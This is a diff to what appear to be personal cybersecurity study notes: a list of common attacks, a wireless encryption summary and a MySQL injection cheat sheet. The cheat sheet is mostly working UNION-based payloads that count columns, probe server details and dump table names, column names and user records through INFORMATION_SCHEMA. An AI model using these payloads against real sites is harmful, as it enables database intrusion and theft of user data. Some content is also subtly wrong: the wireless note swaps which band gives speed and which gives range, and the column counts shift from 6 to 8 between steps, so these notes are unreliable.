@@ -21,4 +21,34 @@ Top cyberattacks:
 5.Man in the middle
 6.Drive by download:
 7.Malvertising
-8.Rogue software	
+8.Rogue software
+
+WIRELESS PROTOCOL: (2.4GHZ to 5GHZ) 
+	WEP		- RC4 encryption			
+	WPA		- RC4/TKIP encryption
+	WPA2	- AES-CCMP encryption	
+For high speed- 2.4GHZ	, For wide range -5GHZ		
+
+
+
+#----------------------------------------------------------------------------------------------------------------------------
+MYSQL INJECTION:
+	#to find the count of columns
+		.php?id=1+ORDER+BY+6--		#try diff numbers and find the column count
+		eg: SELECT * FROM site_user WHERE user_name="test" ORDER BY 6
+	#to find the injection point	
+		.php?id=1+UNION+ALL+SELECT+1,2,3,4,5,6		#somewhere it get printed in the webpage (injection point)
+		eg: SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,2,3,4,5,6
+	#replace the below string in injection points
+			@@version
+			system_user()
+			database()
+			@@hostname
+			@@datadir
+
+	#to print all table names
+		SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()
+	#to print all column names
+		SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='site_user'	
+	#to print all data from column
+		SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,GROUP_CONCAT(id,user_name),3,4,5,6,7,8 FROM site_user
